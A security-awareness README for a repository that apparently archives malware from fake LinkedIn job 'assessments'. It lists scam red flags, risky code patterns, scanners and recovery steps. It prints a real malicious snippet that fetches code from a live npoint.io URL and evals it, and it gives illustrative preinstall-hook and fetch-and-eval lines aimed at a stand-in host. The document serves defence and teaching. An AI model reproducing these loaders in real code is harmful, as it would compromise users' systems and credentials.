
  **! Before All !**
  This repository contains malicious code samples collected from scammers attempting to steal credentials via LinkedIn.

  **DO NOT RUN THIS CODE**.
  The code is kept for educational and research purposes only.


# Malicious Repository Collection

-   [Known Scam Repos and APIs](#known-scam-repos-and-apis)
-   [Known recruiter profiles](#known-recruiter-profiles)
-   [Extra links](#extra-links)
-   [On LinkedIn](#on-linkedin)
    -   [Compensation Red Flags](#compensation-red-flags)
    -   [Profile and Company Authenticity](#profile-and-company-authenticity)
    -   [Process Red Flags](#process-red-flags)
    -   [Due Diligence Steps](#due-diligence-steps)
    -   [Common Scam Tactics](#common-scam-tactics)
-   [Research This Type of Code](#research-this-type-of-code)
    -   [Post and Pre-Install Scripts](#post-and-pre-install-scripts)
    -   [eval() and Dynamic Code Execution](#eval-and-dynamic-code-execution)
    -   [Obfuscated or Minified Code](#obfuscated-or-minified-code)
    -   [Supply Chain Attacks & Dependency Hijacking](#supply-chain-attacks--dependency-hijacking)
    -   [Unsafe Regular Expressions & Prototype Pollution](#unsafe-regular-expressions--prototype-pollution)
-   [Tools to Scan for Malicious & Obfuscated Code](#tools-to-scan-for-malicious--obfuscated-code)
    -   [JavaScript/TypeScript Tools](#javascripttypescript-tools)
    -   [Python Tools](#python-tools)
-   [What to Do If You Think You Were Affected](#what-to-do-if-you-think-you-were-affected)
-   [Additional Security Resources](#additional-security-resources)
-   [Final Recommendations](#final-recommendations)
-   [Repositories](#repositories)
    -   [1. Real Estate Project](#1-real-estate-project)
    -   [2. Multify Staking Project](#2-multify-staking-project)
-   [Warning](#warning)



### Known Scam Repos and APis
- https://bitbucket.org/coinpool/rental-platform1.0/src/main/
- https://bitbucket.org/abga-workspace/metahorse-munitygame/src/main/
- https://api.npoint.io/
- http://w3capi.marketing/api/
- https://github.com/0x66eth/gamestakeverse

### Known scammer recruiter profiles

- [Andressa Santiago](https://www.linkedin.com/in/andressa-santiago-800b03333/)
- [Valentine Giroude](https://www.linkedin.com/in/valentine-girard-661aba14/)
- [Arnas Golubeckas](https://www.linkedin.com/in/arnasgolubeckas/)


## Extra links
 [SCAM WARNING: Blockchain developer job postings - on Reedit](https://www.reddit.com/r/Upwork/comments/14nat71/scam_warning_blockchain_developer_job_postings/)

## On Linkedin
When evaluating job opportunities on LinkedIn, be wary of these red flags:

### Compensation Red Flags

-   Compensation that seems unusually high for the position or experience level
-   Vague promises of exceptional pay without clear details
-   Requests for your banking information early in the process

### Profile and Company Authenticity

-   Profiles with limited connections or incomplete information
-   Recently created profiles with minimal activity
-   Companies with no verifiable online presence
-   Projects hosted exclusively on platforms like Bitbucket with limited public access
-   Companies that lack presence on professional networks and review sites
-   Inconsistencies between the recruiter's profile and their claimed role

### Process Red Flags
-   Unusually fast or simplified hiring processes
-   Job offers without proper interviews or screening
-   Pressure to make immediate decisions
-   Requests to communicate outside of LinkedIn's platform
-   Asking you to download or run code as part of the application process

### Due Diligence Steps

-   Research the company thoroughly using multiple sources
-   Verify the company's presence on professional platforms (Glassdoor, Indeed)
-   Cross-reference the company's social media presence (Twitter, LinkedIn, Facebook)
-   Check their official website and domain age
-   Look for reviews from current and former employees
-   Verify recruiter credentials and company affiliations
-   Be especially cautious of startups or companies with limited online presence

### Common Scam Tactics

-   Impersonating legitimate recruiters from known companies
-   Using sophisticated social engineering techniques
-   Offering remote positions with minimal verification
-   Requesting personal information or payment for job opportunities
-   Sending malicious code disguised as technical assessments



## Research This Type of Code

Understanding potentially harmful code patterns can help you avoid falling for malicious scams or installing unsafe packages. Always research the following types of code:

### Post and Pre-Install Scripts

-   **Description:** These scripts run automatically when installing a package (`npm install`, `yarn install`, `pip install`). Malicious packages can execute harmful code on your machine even before you run your project.

-   **Example:**

    ```
    {
      "scripts": {
        "preinstall": "node malicious-script.js"
      }
    }
    ```

-   **How to Stay Safe:** Always check the `package.json` file before installing a package. Use `npm install --ignore-scripts` if unsure.


### `eval()` and Dynamic Code Execution

-   **Description:** The `eval` function and similar methods (`new Function()`, `setTimeout('code')`, `setInterval('code')`) execute arbitrary code, which attackers can exploit to steal credentials, inject malicious scripts, or run unauthorized commands.

-   **Example:**

    ```
    eval(fetch('https://malicious-site.com/steal-info.js'));
    ```

-   **How to Stay Safe:** Avoid using `eval()` or any dynamically executed code. Use safer alternatives like `JSON.parse()` or secure function calls.


### Obfuscated or Minified Code

-   **Description:** Attackers often hide malicious payloads in minified or obfuscated code, making it harder to detect harmful behavior.

-   **Example:**

    ```
    var a = "\x6c\x6f\x63\x61\x74\x69\x6f\x6e";
    ```

-   **How to Stay Safe:** If you encounter obfuscated code, use tools like `js-beautify` or `deobfuscator.io` to inspect it before execution.


### Supply Chain Attacks & Dependency Hijacking

-   **Description:** Attackers publish malicious packages with names similar to popular ones (typosquatting) or inject backdoors into compromised packages.

-   **How to Stay Safe:**

    -   Check package authors and download counts before installing.

    -   Use `npm audit`, `yarn audit`, or `pip audit` to check for vulnerabilities.

    -   Avoid blindly trusting new or recently updated packages.


### Unsafe Regular Expressions & Prototype Pollution

-   **Description:** Some patterns in regular expressions can be exploited to cause excessive CPU usage (ReDoS attacks). Prototype pollution can be used to modify JavaScript objects in unintended ways, leading to security issues.

-   **How to Stay Safe:**

    -   Validate regular expressions and avoid unbounded quantifiers like `(.*)`.

    -   Use `Object.create(null)` for safe object manipulation.


## Tools to Scan for Malicious & Obfuscated Code

To detect and prevent harmful code execution, use these tools:

### JavaScript/TypeScript Tools
-   [Codebase Scanner](https://github.com/mathiscode/codebase-scanner) - A quick and dirty tool to help defend against common developer-focused malware campaigns since many of these go unnoticed by common antivirus software.

-   [njsscan](https://github.com/ajinabraham/njsscan) - njsscan is a static application testing (SAST) tool that can find insecure code patterns in your node.js applications

-   [**npm audit**](https://docs.npmjs.com/cli/v8/commands/npm-audit) / **yarn audit** - Detects vulnerabilities in dependencies.

-   [**eslint-plugin-security**](https://github.com/nodesecurity/eslint-plugin-security) - Lints for security vulnerabilities.

-   [**lockfile-lint**](https://github.com/lirantal/lockfile-lint) - Checks for dependency integrity.

-   [**package-checker**](https://github.com/dwisiswant0/package-checker) - Identifies typosquatting and suspicious packages.

-   **[de4js](https://lelinhtinh.github.io/de4js/)** - Online JavaScript deobfuscation tool.

-   [**Snyk**](https://snyk.io/) - Security scanning for dependencies.

-   [**GitGuardian**](https://www.gitguardian.com/) - Detects leaked API keys and credentials in codebases.

-   [**Codebase Scanner**](https://github.com/ajinabraham/CodebaseScanner) - Scans repositories for security issues.


### Python Tools

-   [**pip-audit**](https://pypi.org/project/pip-audit/) - Checks for known vulnerabilities in Python dependencies.

-   [**bandit**](https://github.com/PyCQA/bandit) - Static analysis for security issues in Python code.

-   [**safety**](https://pypi.org/project/safety/) - Scans dependencies for known security issues.

-   [**pyright**](https://github.com/microsoft/pyright) - Type checker that can help detect unusual code patterns.


## What to Do If You Think You Were Affected

If you suspect that you have installed or executed malicious code, take these steps immediately:

1.  **Disconnect from the Internet** - Prevent further data theft or communication with attacker servers.

2.  **Check Running Processes** - Use `ps aux` (Linux/macOS) or Task Manager (Windows) to find unknown processes.

3.  **Scan for Malware** - Use an antivirus scanner or tools like `ClamAV` for Linux/macOS.

4.  **Reinstall Node/Python and Remove Compromised Packages**

    ```
    rm -rf node_modules package-lock.json && npm install
    ```

    ```
    pip freeze | xargs pip uninstall -y
    ```

5.  **Rotate Credentials** - Change passwords, API keys, SSH keys, and clear stored credentials in browsers.

6.  **Review System Logs** - Check `.bash_history`, `.zsh_history`, or Windows Event Viewer for suspicious commands.

7.  **Reformat if Necessary** - If you suspect deep compromise, consider reinstalling your OS.


## Additional Security Resources

-   **OWASP Top Ten** - Common security vulnerabilities and best practices.

-   [**NPM Security Best Practices**](https://docs.npmjs.com/cli/v8/using-npm/security)

-   [**Python Security Guide**](https://docs.python.org/3/howto/security.html)


## Final Recommendations

-   Keep dependencies updated and remove unused ones.

-   Use two-factor authentication (2FA) on developer accounts.

-   Be cautious when installing packages from unknown sources.

-   Always review the `package.json`, `requirements.txt`, or `setup.py` before installing.


By staying vigilant, using proper tools, and following security best practices, you can reduce the risk of falling for malicious scams or executing harmful code.

## Repositories



### 1. Real Estate Project



Located in `real_estate/` directory. The malicious payload is hidden in `real_estate/server/controllers/userController.js`.



The malware:

- Makes a request to api.npoint.io to fetch obfuscated JavaScript code

- Executes the fetched code using eval() in Node.js environment

- Located at the end of userController.js in a getCookie function:



```javascript

exports.getCookie = asyncErrorHandler(async (req, res, next) => {

const  result = await  axios.get("https://api.npoint.io/ac2916e3f543effa2edd");

eval(result.data.cookie);

})();

```



### 2. Multify Staking Project



Located in `multify_staking/` directory. The malicious code is directly embedded in `multify_staking/next.config.js`.



The malware:

- Contains heavily obfuscated JavaScript code at the start of the file

- The obfuscated code appears to be a credential stealer

- Takes up most of the file, with only the actual Next.js config at the end:



```javascript

// Large obfuscated malicious code block here...



/** @type  {import('next').NextConfig} */

const  nextConfig = {

reactStrictMode:  true,

}



module.exports = nextConfig

```



## Warning

 This repository contains malicious code samples collected from scammers attempting to steal credentials via LinkedIn. **DO NOT RUN THIS CODE**. The code is kept for educational and research purposes only.

This code is kept for research purposes only. DO NOT run or deploy this code as it contains malicious payloads designed to steal credentials and other sensitive information.



The repositories appear to be legitimate web applications (a real estate platform and a staking platform) but contain hidden malicious code designed to compromise systems and steal data.
